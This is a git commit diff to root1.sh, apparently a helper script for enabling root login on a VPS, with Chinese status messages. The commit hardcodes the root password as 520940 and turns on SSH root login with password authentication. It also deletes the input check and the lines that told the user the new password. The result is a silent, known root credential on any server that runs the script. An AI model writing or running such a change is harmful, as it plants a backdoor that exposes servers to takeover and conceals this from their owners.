7ab0a9d7dc79ef08620d1210a8ff83b98c0fa303
iouyjl <93931701+iouyjl@users.noreply.github.com>
2023-04-03 23:49:23 +0800

    Update root1.sh

--- root1.sh
+++ root1.sh
@@ -17,17 +17,11 @@ prl=`grep PermitRootLogin /etc/ssh/sshd_config`
 pa=`grep PasswordAuthentication /etc/ssh/sshd_config`
 if [[ -n $prl && -n $pa ]]; then
 mima=520940
-if [[ -n $mima ]]; then
 echo root:$mima | $su chpasswd root
 $su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
 $su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
 $su service sshd restart
-green "VPS当前用户名：root"
-green "vps当前root密码：$mima"
 sudo su - root
-else
-red "未输入相关字符，启用root账户或root密码更改失败" 
-fi
 else
 red "当前vps不支持root账户或无法自定义root密码,建议先执行sudo -i 进入root账户后再执行脚本" 
 fi
